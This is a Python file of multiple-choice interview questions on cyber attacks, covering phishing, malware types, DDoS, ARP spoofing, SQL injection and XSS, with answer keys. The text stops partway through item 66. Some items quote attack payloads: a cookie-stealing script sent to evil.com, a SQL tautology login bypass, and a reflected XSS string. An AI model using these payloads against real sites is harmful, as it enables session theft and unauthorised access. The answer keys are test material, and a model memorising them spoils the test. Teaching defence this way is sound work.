"""
Part 3: Cyber Attacks Questions (IDs 46-80, 35 Questions)
Strictly adheres to:
- Phishing vs Spear Phishing vs Whaling
- Malware taxonomy: Virus vs Worm vs Trojan vs Spyware vs Ransomware
- DoS vs DDoS (SYN flood, UDP amplification, HTTP flood)
- Man-in-the-Middle (MITM, ARP spoofing, SSL stripping, DNS poisoning)
- Brute Force vs Credential Stuffing vs Dictionary attacks
- SQL Injection (tautology, union-based, blind SQLi, prepared statements)
- Cross-Site Scripting (Reflected, Stored, DOM-based, cookie theft, CSP)
- Social Engineering (pretexting, baiting, tailgating, vishing)
- Attack vectors, symptoms, log analysis, first defensive responder actions
"""

def get_questions_part3_cyber_attacks():
    return [
        {
            "id": 46,
            "question": "A finance executive receives an urgent email that appears to come directly from the company's Chief Financial Officer (CFO). The email references an ongoing confidential corporate acquisition known only to three senior staff members and requests an immediate wire transfer of $250,000 to an offshore vendor account. What specific category of social engineering attack is this?",
            "options": {
                "A": "Mass Phishing",
                "B": "Whaling (Executive Spear Phishing)",
                "C": "Watering Hole Attack",
                "D": "Drive-by Download"
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "Phishing vs Spear Phishing vs Whaling",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["Accenture-style", "Cognizant-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Whaling is a highly targeted form of spear phishing aimed specifically at senior executives, high-net-worth individuals, or key finance personnel. It leverages deep reconnaissance and confidential context (often spoofing the CEO or CFO) to authorize fraudulent financial transactions or data releases.",
            "why_other_options_are_wrong": {
                "A": "Mass phishing sends generic, untargeted emails to thousands of indiscriminate recipients simultaneously.",
                "B": "Correct: Targeting high-profile corporate executives with confidential insider context is Whaling.",
                "C": "A Watering Hole attack infects a third-party website frequently visited by the target group.",
                "D": "Drive-by downloads silently install malware when a user visits a compromised web page without user clicks."
            },
            "real_world_application": "Business Email Compromise (BEC) defenses enforcing out-of-band phone verification for wire transfers exceeding company thresholds."
        },
        {
            "id": 47,
            "question": "An IT security technician analyzes an infection spreading across an enterprise office floor. Within 20 minutes, 150 Windows workstations are infected across the corporate subnet. The technician discovers that the malware exploits an unpatched SMBv1 remote code execution vulnerability (MS17-010) to replicate itself across network ports without requiring any human action, email clicking, or file opening. How is this malware classified?",
            "options": {
                "A": "Trojan Horse",
                "B": "Macro Virus",
                "C": "Network Worm",
                "D": "Logic Bomb"
            },
            "correct_answer": "C",
            "topic": "Cyber Attacks",
            "subtopic": "Malware Taxonomy: Worm vs Virus vs Trojan",
            "difficulty": "Medium-Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["TCS-style", "Infosys-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "A computer Worm is self-replicating, autonomous malware that propagates across computer networks by exploiting software vulnerabilities without requiring human intervention or a host program. In contrast, a Virus requires a host file and user action to execute, while a Trojan relies on social engineering deception.",
            "why_other_options_are_wrong": {
                "A": "A Trojan disguises itself as legitimate software and requires the user to execute it; it does not autonomously propagate across networks.",
                "B": "A Macro Virus attaches to Office documents (Word/Excel) and requires users to open the document and enable macros.",
                "C": "Correct: Autonomous propagation across networks exploiting service vulnerabilities without user interaction defines a Worm.",
                "D": "A Logic Bomb lies dormant until triggered by a specific date, event, or condition."
            },
            "real_world_application": "The global 2017 WannaCry and NotPetya outbreaks which used the EternalBlue SMB exploit as a network worm."
        },
        {
            "id": 48,
            "question": "A user downloads a free utility program called `PC_Speed_Booster.exe` from a third-party website. When run, it displays a convincing progress bar claiming to optimize system RAM. However, in the background, it silently opens port 4444 and establishes a reverse shell connection to an attacker's Command & Control (C2) server. Which malware type does this represent?",
            "options": {
                "A": "Ransomware",
                "B": "Trojan Horse",
                "C": "Worm",
                "D": "Adware"
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "Trojan Horse Identification",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["Wipro-style", "Capgemini-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "A Trojan Horse is malicious software that misleads users of its true intent by disguising itself as a legitimate, desirable application while secretly executing harmful background operations (like opening backdoors or exfiltrating data).",
            "why_other_options_are_wrong": {
                "A": "Ransomware encrypts user files and demands payment; it does not masquerade merely as a utility to maintain covert access.",
                "B": "Correct: Disguising malicious functionality inside an apparently benign program is the exact definition of a Trojan.",
                "C": "A worm propagates autonomously across the network without requiring a user to download and run it.",
                "D": "Adware primarily displays unwanted advertisements and pop-ups for revenue generation."
            },
            "real_world_application": "Endpoint Detection and Response (EDR) detecting suspicious reverse TCP connections initiated by unsigned user binaries."
        },
        {
            "id": 49,
            "question": "An employee notices their desktop wallpaper has suddenly been changed to a black screen with red text stating: 'All your files have been encrypted with military-grade AES-256 and RSA-4096. To obtain the private key, deposit 2.5 Bitcoin to the following wallet address within 72 hours.' What is the FIRST and most urgent action the employee or first-responder should take?",
            "options": {
                "A": "Immediately disconnect the computer's Ethernet cable and disable its Wi-Fi adapter to isolate it from the corporate network.",
                "B": "Open the web browser and visit the Bitcoin payment portal to verify the attacker's wallet address.",
                "C": "Run a disk defragmentation utility to reorganize the hard drive sectors.",
                "D": "Send a company-wide email asking colleagues if they have an extra copy of the decryption key."
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Ransomware Response & Containment",
            "difficulty": "Medium",
            "question_type": "Application-Based",
            "company_pattern": ["Accenture-style", "Deloitte-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "The immediate first step in ransomware containment is physical and logical network isolation (unplugging Ethernet, disabling Wi-Fi/Bluetooth). This halts lateral movement and stops the malware from spreading to network shared drives, other subnet hosts, and active backup repositories.",
            "why_other_options_are_wrong": {
                "A": "Correct: Rapid network isolation halts the blast radius and prevents encryption of shared mapped drives and adjacent endpoints.",
                "B": "Visiting the payment portal does not contain the outbreak and signals to the attacker that the victim is active.",
                "C": "Running defragmentation writes and moves data across disk sectors, permanently overwriting any recoverable shadow copies or memory artifacts.",
                "D": "Sending emails delays incident response and does not stop the malware from encrypting more files."
            },
            "real_world_application": "NIST SP 800-61 Rev. 2 Incident Handling Guide: Phase 3 - Containment, Eradication, and Recovery."
        },
        {
            "id": 50,
            "question": "A web application's user login form contains two input fields: Username and Password. When an attacker inputs the string `' OR '1'='1` into the username field, the application bypasses password verification and logs the attacker in as the system Administrator. What specific vulnerability and attack occurred?",
            "options": {
                "A": "Cross-Site Scripting (XSS)",
                "B": "SQL Injection (SQLi) via Tautology Manipulation",
                "C": "Buffer Overflow via Stack Smashing",
                "D": "Server-Side Request Forgery (SSRF)"
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "SQL Injection Mechanics",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["TCS-style", "Cognizant-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "This is an SQL Injection (SQLi) tautology attack. When the unsanitized input is concatenated into an SQL string like `SELECT * FROM users WHERE user = '' OR '1'='1' AND pass = '...'`, the condition `'1'='1'` evaluates to TRUE for every record, returning the first row (usually Administrator) and bypassing authentication.",
            "why_other_options_are_wrong": {
                "A": "XSS executes malicious JavaScript inside the victim's web browser, not backend database queries.",
                "B": "Correct: Injecting SQL syntax to alter database query logic is SQL Injection.",
                "C": "Buffer overflows exploit memory bounds in native C/C++ binaries, not relational SQL query strings.",
                "D": "SSRF induces a backend server to make outbound network requests to internal resources."
            },
            "real_world_application": "Remediating OWASP Top 10 A03:2021-Injection by rewriting raw queries using Prepared Statements (Parameterized Queries)."
        },
        {
            "id": 51,
            "question": "Which of the following backend database implementations is the ONLY foolproof, industry-standard defense against SQL Injection vulnerabilities?",
            "options": {
                "A": "Filtering and stripping out the single quote character (`'`) and double hyphens (`--`) using regex",
                "B": "Parameterized Queries (Prepared Statements) where SQL code and user-supplied data are treated as fundamentally separate channels",
                "C": "Encrypting the entire SQL query string with AES-256 before passing it to the database engine",
                "D": "Converting all GET HTTP requests into POST requests"
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "Defending against SQL Injection",
            "difficulty": "Medium-Hard",
            "question_type": "Application-Based",
            "company_pattern": ["Infosys-style", "Accenture-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Parameterized queries (prepared statements) compile the SQL query template first. When user parameters are bound later, the database engine treats user input strictly as literal data values, making it syntactically impossible for user input to alter the structure of the SQL command.",
            "why_other_options_are_wrong": {
                "A": "Blacklist character filtering is notorious for being bypassed by encoding tricks (e.g. hex, unicode, double URL encoding).",
                "B": "Correct: Parameterized queries enforce strict separation of code and data, completely neutralizing SQL injection.",
                "C": "The database engine must decrypt the query to execute it, leaving the injected syntax intact.",
                "D": "POST requests are just as vulnerable to SQL injection as GET requests; HTTP verbs provide no database protection."
            },
            "real_world_application": "Using `PreparedStatement` in Java JDBC or parameterized ORM queries in Hibernate / Entity Framework."
        },
        {
            "id": 52,
            "question": "An attacker discovers that a blog website allows visitors to submit comments that are stored in the database and rendered directly on the page for all other visitors. The attacker submits: `<script>fetch('https://evil.com/steal?c=' + document.cookie);</script>`. When any other user views the blog post, their browser silently transmits their session cookie to the attacker. Which type of Cross-Site Scripting (XSS) is this?",
            "options": {
                "A": "Reflected XSS (Non-Persistent)",
                "B": "Stored XSS (Persistent)",
                "C": "DOM-Based XSS",
                "D": "Blind SQL Injection"
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "Cross-Site Scripting (Stored XSS)",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["HCLTech-style", "Cognizant-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Stored (or Persistent) XSS occurs when malicious JavaScript payload is permanently saved on the target server (e.g., in a database, comment field, or profile) and subsequently served to multiple unsuspecting victims when they view the affected page, executing in their browsers.",
            "why_other_options_are_wrong": {
                "A": "Reflected XSS reflects the payload immediately off the server in a single request (e.g., via a search URL parameter) without storing it.",
                "B": "Correct: Storing the malicious script in the database so it executes for subsequent visitors is Stored XSS.",
                "C": "DOM-based XSS executes strictly in the client-side JavaScript environment without necessarily touching the server.",
                "D": "The attack executes browser JavaScript to steal cookies, not backend SQL queries."
            },
            "real_world_application": "Preventing session hijacking by setting the `HttpOnly` flag on session cookies and applying context-aware HTML output encoding."
        },
        {
            "id": 53,
            "question": "A security engineer inspects a web application to prevent Cross-Site Scripting (XSS) attacks from stealing session cookies. Which HTTP response header flag prevents client-side JavaScript (including injected XSS payloads) from accessing the `document.cookie` object?",
            "options": {
                "A": "Secure",
                "B": "SameSite=Strict",
                "C": "HttpOnly",
                "D": "X-Frame-Options: DENY"
            },
            "correct_answer": "C",
            "topic": "Cyber Attacks",
            "subtopic": "Mitigating XSS Cookie Theft",
            "difficulty": "Medium",
            "question_type": "Direct Conceptual",
            "company_pattern": ["Wipro-style", "LTIMindtree-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "The `HttpOnly` cookie attribute instructs the browser that the cookie should not be accessible via client-side scripts (such as `document.cookie`). Even if an attacker successfully executes an XSS payload in the victim's browser, the browser blocks access to `HttpOnly` cookies, preventing session hijacking.",
            "why_other_options_are_wrong": {
                "A": "The `Secure` attribute ensures cookies are only transmitted over encrypted HTTPS connections, but allows JS access.",
                "B": "`SameSite=Strict` controls whether cookies are sent on cross-site requests, mitigating Cross-Site Request Forgery (CSRF).",
                "C": "Correct: `HttpOnly` explicitly shields cookies from JavaScript DOM APIs, neutralizing XSS credential theft.",
                "D": "`X-Frame-Options: DENY` prevents Clickjacking by blocking the site from being rendered inside an iframe."
            },
            "real_world_application": "Hardening session management cookies in Spring Boot and Express.js with `res.cookie('session_id', token, { httpOnly: true, secure: true })`."
        },
        {
            "id": 54,
            "question": "How does a Distributed Denial of Service (DDoS) attack fundamentally differ from a traditional single-source Denial of Service (DoS) attack from a defense and mitigation perspective?",
            "options": {
                "A": "DoS attacks target application software, whereas DDoS attacks only target physical ethernet cables.",
                "B": "A DoS attack originates from a single IP address which can be easily blocked by a simple firewall rule, whereas a DDoS attack originates from tens of thousands of geographically dispersed botnet IPs simultaneously, rendering simple IP blocking ineffective.",
                "C": "DDoS attacks can only occur over wireless Wi-Fi networks.",
                "D": "DoS attacks steal passwords, while DDoS attacks erase hard drives."
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "DoS vs DDoS Comparison",
            "difficulty": "Medium",
            "question_type": "Comparison",
            "company_pattern": ["Accenture-style", "TCS-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "In a simple DoS, traffic comes from one machine; dropping packets from that single source IP mitigates the attack. In a DDoS, the attacker commands a distributed botnet (compromised IoT devices, servers, PCs) across hundreds of countries. Blocking individual IPs is futile, requiring upstream volumetric scrubbing centers and Anycast routing.",
            "why_other_options_are_wrong": {
                "A": "Both DoS and DDoS can target any layer of the OSI model (Layer 3/4 network exhaustion or Layer 7 application exhaustion).",
                "B": "Correct: The distributed, multi-source nature of botnets overwhelms single-IP firewall blacklists and saturates uplink bandwidth.",
                "C": "DDoS traffic traverses the global public internet across wired and wireless infrastructures alike.",
                "D": "Denial of service attacks target Availability; they are not designed for data exfiltration or drive wiping."
            },
            "real_world_application": "Deploying Akamai / Cloudflare Anycast scrubbing networks capable of absorbing 2+ Terabit/second volumetric DDoS floods."
        },
        {
            "id": 55,
            "question": "A network security administrator reviews firewall connection tables during an ongoing server slowdown and observes thousands of half-open TCP connections: `TCP 198.51.100.22:443 SYN_RECEIVED`. The clients continuously send SYN packets but never respond to the server's SYN-ACK with an ACK, exhausting the server's connection state memory buffer. What specific attack is being executed?",
            "options": {
                "A": "SYN Flood Attack",
                "B": "Smurf Attack",
                "C": "Ping of Death",
                "D": "SQL Injection"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Network Protocol Attacks (SYN Flood)",
            "difficulty": "Medium-Hard",
            "question_type": "Log or Event Analysis",
            "company_pattern": ["Infosys-style", "Capgemini-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "A TCP SYN Flood exploits the 3-way handshake. The attacker sends massive volumes of SYN packets with spoofed source IPs. The server allocates kernel memory for each connection in its backlog queue and responds with SYN-ACK, waiting in the `SYN_RECEIVED` state. Because no ACK arrives, the queue fills up, denying legitimate new connections.",
            "why_other_options_are_wrong": {
                "A": "Correct: Flooding SYN packets leaving connections in `SYN_RECEIVED` state to exhaust connection queues is a SYN Flood.",
                "B": "A Smurf attack broadcasts ICMP Echo requests to an amplification network with a spoofed victim IP.",
                "C": "Ping of Death sends oversized ICMP packets larger than 65,535 bytes to crash legacy IP stacks.",
                "D": "SQL injection is an application-layer database attack, completely unrelated to TCP state tables."
            },
            "real_world_application": "Enabling SYN Cookies (`sysctl -w net.ipv4.tcp_syncookies=1`) on Linux servers to avoid allocating state until the handshake completes."
        },
        {
            "id": 56,
            "question": "An attacker sitting in a local coffee shop broadcasts fake ARP replies across the local Wi-Fi subnet claiming that their own MAC address is associated with the default gateway's IP address (192.168.1.1). Consequently, all laptops on the Wi-Fi send their outbound internet traffic directly through the attacker's machine. What type of attack is this, and what is the primary threat?",
            "options": {
                "A": "ARP Poisoning / Spoofing enabling a Man-in-the-Middle (MITM) attack",
                "B": "Cross-Site Request Forgery (CSRF) enabling Remote Code Execution",
                "C": "Buffer Overflow enabling Denial of Service",
                "D": "Ransomware infection enabling Drive Encryption"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Man-in-the-Middle (ARP Spoofing)",
            "difficulty": "Medium-Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["Cognizant-style", "Accenture-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Because Address Resolution Protocol (ARP) is stateless and lacks authentication, devices accept unsolicited ARP replies. ARP Poisoning allows an attacker to associate their MAC address with the router's IP, positioning themselves directly in the path of all local communications to eavesdrop, tamper, or intercept credentials (MITM).",
            "why_other_options_are_wrong": {
                "A": "Correct: Poisoning the local subnet's ARP cache to intercept client traffic is classic ARP Spoofing / MITM.",
                "B": "CSRF tricks a victim's browser into submitting unwanted actions on an authenticated website, unrelated to Layer 2 ARP.",
                "C": "Buffer overflows exploit memory management in applications, not Layer 2 Ethernet frame routing.",
                "D": "ARP spoofing redirects network packets; it does not execute ransomware encryption on disks."
            },
            "real_world_application": "Enabling Dynamic ARP Inspection (DAI) and 802.1X port authentication on managed Cisco enterprise switches."
        },
        {
            "id": 57,
            "question": "A web security scanner flags an issue where an attacker who has positioned themselves as a Man-in-the-Middle intercepts an initial unencrypted HTTP connection (`http://mybank.com`) and intercepts the 301 Redirect to HTTPS, continuing to serve the user an unencrypted HTTP version while communicating with the bank over HTTPS in the background. What is this attack called, and what security control was specifically created to prevent it?",
            "options": {
                "A": "SSL Stripping, prevented by HTTP Strict Transport Security (HSTS)",
                "B": "SQL Injection, prevented by Web Application Firewalls",
                "C": "DNS Amplification, prevented by BGP Anycast",
                "D": "Clickjacking, prevented by Content Security Policy"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "SSL Stripping & HSTS Defense",
            "difficulty": "Hard",
            "question_type": "Conceptual Trap",
            "company_pattern": ["Deloitte-style", "IBM-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "SSL Stripping (introduced by Moxie Marlinspike) downgrades secure HTTPS links to plain unencrypted HTTP. HTTP Strict Transport Security (HSTS - RFC 6797) instructs browsers via the `Strict-Transport-Security` header to ONLY ever connect to the site using HTTPS, automatically upgrading any HTTP link client-side before any packet leaves the machine.",
            "why_other_options_are_wrong": {
                "A": "Correct: SSL Stripping downgrades HTTPS to HTTP; HSTS mandates browser-side HTTPS enforcement to prevent it.",
                "B": "SQL injection attacks backend database parameters, not transport-layer TLS redirects.",
                "C": "DNS Amplification exploits open DNS resolvers for volumetric DDoS.",
                "D": "Clickjacking overlays transparent UI layers to trick users into clicking hidden buttons."
            },
            "real_world_application": "Configuring `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` and submitting domains to the HSTS Preload list."
        },
        {
            "id": 58,
            "question": "An authentication log shows 10,000 login attempts against an enterprise customer portal in 15 minutes. Crucially, the attacker does not attempt 10,000 passwords against a single user account. Instead, the attacker attempts just ONE common password ('Summer2025!') across 10,000 distinct usernames. What specialized attack technique is this, and why is it used?",
            "options": {
                "A": "Rainbow Table Attack, used to bypass salt entropy",
                "B": "Password Spraying, used to avoid triggering per-user account lockout thresholds",
                "C": "Timing Attack, used to measure cryptographic comparison latency",
                "D": "ARP Spoofing, used to rewrite MAC addresses in the switch CAM table"
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "Brute Force vs Password Spraying",
            "difficulty": "Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["Accenture-style", "TCS-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Password Spraying tests a single or small handful of common, seasonal passwords against thousands of user accounts. Traditional brute force (trying thousands of passwords on one user) triggers account lockouts after 3-5 failed attempts. Spraying keeps attempts below the individual lockout threshold while still breaching users who pick weak passwords.",
            "why_other_options_are_wrong": {
                "A": "Rainbow tables crack stolen offline password hashes, not live online web login endpoints.",
                "B": "Correct: Password spraying tests one password across many accounts to fly under account lockout radars.",
                "C": "Timing attacks measure microsecond differences in server processing times.",
                "D": "ARP spoofing manipulates local Ethernet frames on a LAN, not application login forms."
            },
            "real_world_application": "Deploying behavioral IP rate-limiting, CAPTCHA on failed site-wide attempts, and Microsoft Entra ID Smart Lockout."
        },
        {
            "id": 59,
            "question": "An attacker acquires a massive database dump of 50 million email-and-password pairs leaked from a compromised gaming forum. The attacker loads these credentials into an automated bot that tests them against online banking portals, social media platforms, and e-commerce websites. What attack is being conducted?",
            "options": {
                "A": "Credential Stuffing",
                "B": "SQL Injection",
                "C": "Man-in-the-Middle",
                "D": "Watering Hole Attack"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Credential Stuffing Mechanics",
            "difficulty": "Medium",
            "question_type": "Direct Conceptual",
            "company_pattern": ["Capgemini-style", "Infosys-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Credential Stuffing is the automated injection of breached username/password pairs across multiple unrelated web applications, exploiting the widespread human habit of reusing identical passwords across different services.",
            "why_other_options_are_wrong": {
                "A": "Correct: Reusing leaked credentials from one breach to compromise accounts on other services is Credential Stuffing.",
                "B": "SQL Injection exploits backend SQL query syntax flaws, not stolen valid credentials.",
                "C": "Man-in-the-Middle intercepts communications in flight between two active parties.",
                "D": "Watering Hole compromises websites frequented by a specific target demographic."
            },
            "real_world_application": "Enforcing Multi-Factor Authentication (MFA) and monitoring HaveIBeenPwned API feeds to force password resets on breached accounts."
        },
        {
            "id": 60,
            "question": "A security analyst reviews web server access logs and finds the following entry: `GET /search.php?query=<img+src=x+onerror=alert(document.domain)> HTTP/1.1 200`. The user who clicked this URL observed a JavaScript pop-up box displaying the domain name. However, when other users visit the search page directly, no pop-up occurs. Which vulnerability is this?",
            "options": {
                "A": "Reflected Cross-Site Scripting (Non-Persistent XSS)",
                "B": "Stored Cross-Site Scripting (Persistent XSS)",
                "C": "Remote File Inclusion (RFI)",
                "D": "Path Traversal"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Reflected XSS Analysis",
            "difficulty": "Medium-Hard",
            "question_type": "Log or Event Analysis",
            "company_pattern": ["Cognizant-style", "TCS-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Reflected XSS occurs when unvalidated user input provided in an HTTP request (such as a search query parameter) is immediately reflected back in the server's immediate HTTP response page without being stored. It only executes for the specific victim who clicks the crafted malicious link.",
            "why_other_options_are_wrong": {
                "A": "Correct: Immediate reflection of input without server-side database storage is Reflected (Non-Persistent) XSS.",
                "B": "Stored XSS saves the script in the database so that everyone who visits the page is affected, which was ruled out.",
                "C": "Remote File Inclusion involves executing code hosted on a remote external server into the server-side runtime.",
                "D": "Path Traversal uses `../` sequences to access unauthorized directories on the server's local file system."
            },
            "real_world_application": "Remediating reflected parameters by ensuring all user input rendered into HTML is sanitized with contextual HTML entity encoding."
        },
        {
            "id": 61,
            "question": "An attacker creates a convincing clone of a corporate HR benefits login portal. They send an email to all staff: 'Open Enrollment closes at 5 PM! Click here to confirm your health insurance coverage.' When employees click the link, they are taken to the clone site and enter their corporate usernames, passwords, and 2FA SMS codes, which the attacker captures in real-time. Which attack does this describe?",
            "options": {
                "A": "Phishing via Adversary-in-the-Middle (AiTM) Reverse Proxy",
                "B": "SQL Injection",
                "C": "Buffer Overflow",
                "D": "Distributed Denial of Service"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Modern Phishing Techniques",
            "difficulty": "Medium-Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["Accenture-style", "Deloitte-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "This describes modern phishing using an Adversary-in-the-Middle (AiTM) reverse proxy (tools like Evilginx). By cloning the legitimate site and proxying requests in real-time, the attacker intercepts not only passwords but also dynamic multi-factor authentication session tokens and cookies.",
            "why_other_options_are_wrong": {
                "A": "Correct: Tricking users into entering credentials and MFA tokens into a deceptive replica site is Phishing (specifically AiTM).",
                "B": "SQL Injection exploits database parameters, not email-based credential deception.",
                "C": "Buffer overflows target memory allocation in executable software.",
                "D": "DDoS attacks saturate availability, whereas phishing is focused on credential theft."
            },
            "real_world_application": "Transitioning from phishable MFA (SMS/push notifications) to FIDO2 / WebAuthn hardware security keys (YubiKeys) which bind to the origin domain."
        },
        {
            "id": 62,
            "question": "What is the key technical difference between a Computer Virus and a Computer Worm?",
            "options": {
                "A": "A virus only targets Linux systems, while a worm only targets Windows systems.",
                "B": "A virus attaches itself to a host file/program and requires user action (execution) to spread, whereas a worm is a standalone program that replicates and spreads across networks autonomously without user intervention.",
                "C": "A virus is encrypted, while a worm is transmitted in plaintext.",
                "D": "A virus encrypts user data for ransom, while a worm is exclusively used for mining cryptocurrency."
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "Virus vs Worm Distinction",
            "difficulty": "Medium",
            "question_type": "Comparison",
            "company_pattern": ["Wipro-style", "Infosys-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "A Virus cannot stand alone; it must attach its code to an existing legitimate host executable or document, activating only when a user executes the infected file. A Worm is completely independent, needing no host program and no human intervention to replicate across network sockets.",
            "why_other_options_are_wrong": {
                "A": "Both viruses and worms can target any operating system architecture.",
                "B": "Correct: Virus requires a host program and user trigger; Worm is self-contained and autonomously propagates across networks.",
                "C": "Both malware types can be polymorphic, packed, or encrypted.",
                "D": "Payloads vary widely; viruses and worms are classified by their replication and propagation mechanisms, not their ultimate payload."
            },
            "real_world_application": "Designing firewall and host isolation rules to contain self-propagating worms compared to endpoint antivirus scanning files for viruses."
        },
        {
            "id": 63,
            "question": "A rogue insider in an engineering department is notified that their employment will be terminated in 30 days. The employee silently commits a hidden script into the source code repository: `if (current_date > '2026-11-01') { drop_database_cascade(); }`. What specific form of malicious logic is this?",
            "options": {
                "A": "Logic Bomb",
                "B": "Spyware",
                "C": "Rootkit",
                "D": "Cross-Site Scripting"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Logic Bomb Characteristics",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["Capgemini-style", "Cognizant-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "A Logic Bomb is malicious code inserted into software that remains dormant until triggered by a specific condition or event (such as a future calendar date, an employee's account deletion, or a specific system command).",
            "why_other_options_are_wrong": {
                "A": "Correct: Dormant code set to execute destructive payloads upon meeting a trigger condition is a Logic Bomb.",
                "B": "Spyware covertly monitors user behavior and transmits sensitive information to third parties.",
                "C": "A Rootkit alters operating system kernel internals to conceal malicious processes and maintain persistent administrative access.",
                "D": "XSS executes JavaScript in client browsers, not scheduled database destruction in backend code."
            },
            "real_world_application": "Mandating peer code reviews, CI/CD pipeline branch protection rules, and immediate revocation of access upon termination notices."
        },
        {
            "id": 64,
            "question": "An employee at an enterprise finds a shiny USB flash drive in the corporate parking lot labeled 'Q4_Executive_Salaries_and_Bonus_List.xlsx'. Out of curiosity, the employee plugs the USB drive into their work computer and opens the file, silently executing an embedded malicious payload. What social engineering technique did the attacker use?",
            "options": {
                "A": "Baiting",
                "B": "Tailgating / Piggybacking",
                "C": "Vishing",
                "D": "Whaling"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Social Engineering (Baiting)",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["Accenture-style", "HCLTech-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Baiting relies on human curiosity or greed. The attacker leaves malware-infected physical media (like USB drives or external disks) in public or targeted locations (parking lots, cafeterias) with enticing labels, waiting for an employee to plug it in and trigger the payload.",
            "why_other_options_are_wrong": {
                "A": "Correct: Leaving physical media with enticing labels to trick victims into running malware is Baiting.",
                "B": "Tailgating involves physically following an authorized person through a secured badge-access door.",
                "C": "Vishing is voice phishing conducted over telephone calls.",
                "D": "Whaling is high-level spear phishing targeted at C-suite executives via email."
            },
            "real_world_application": "Disabling USB removable mass storage via Active Directory Group Policy (GPO) or endpoint protection software."
        },
        {
            "id": 65,
            "question": "A person wearing delivery uniform and carrying two large, heavy cardboard boxes approaches the badge-restricted entrance of an IT development center. As an authorized software developer badges in, the delivery person smiles and asks: 'Could you hold the door for me? My hands are completely full!' The developer politely holds the door open, allowing the unbadged person to enter the secure facility. What physical security breach occurred?",
            "options": {
                "A": "Tailgating / Piggybacking",
                "B": "Pretexting via Vishing",
                "C": "Dumpster Diving",
                "D": "Shoulder Surfing"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Physical Social Engineering (Tailgating)",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["TCS-style", "Infosys-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Tailgating (or Piggybacking) occurs when an unauthorized individual gains physical access to a restricted facility by closely following an authorized employee through a checkpoint, often exploiting social courtesy or a plausible pretext (like carrying heavy packages).",
            "why_other_options_are_wrong": {
                "A": "Correct: Following an authorized person through a physical access control point is Tailgating.",
                "B": "Vishing is voice phishing conducted over phone systems.",
                "C": "Dumpster diving searches through physical trash bins for discarded documents and passwords.",
                "D": "Shoulder surfing involves watching someone enter their PIN or password over their shoulder."
            },
            "real_world_application": "Installing turnstiles, mantraps (airlocks), and security awareness training instructing staff never to hold doors in secure zones."
        },
        {
            "id": 66,
            "question": "A cybersecurity incident response team discovers malware installed in the ring-0 kernel space of an enterprise domain controller. The malware intercepts Windows operating system API calls (`NtQuerySystemInformation`), making its own processes, network sockets, and file system directories completely invisible to the Windows Task Manager and standard antivirus scanners. What type of malware is this?",
            "options": {
                "A": "Rootkit",
                "B": "Adware",
                "C": "Keylogger",
                "D": "Macro Virus"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Rootkits & Kernel-level Evasion",
            "difficulty": "Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["IBM-style", "Deloitte-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "A Rootkit is a stealthy collection of software designed to provide continuous privileged access (root/admin) while actively hiding its presence by hooking into the OS kernel, hypervisor, or system APIs to alter output and blind administrative inspection tools.",
            "why_other_options_are_wrong": {
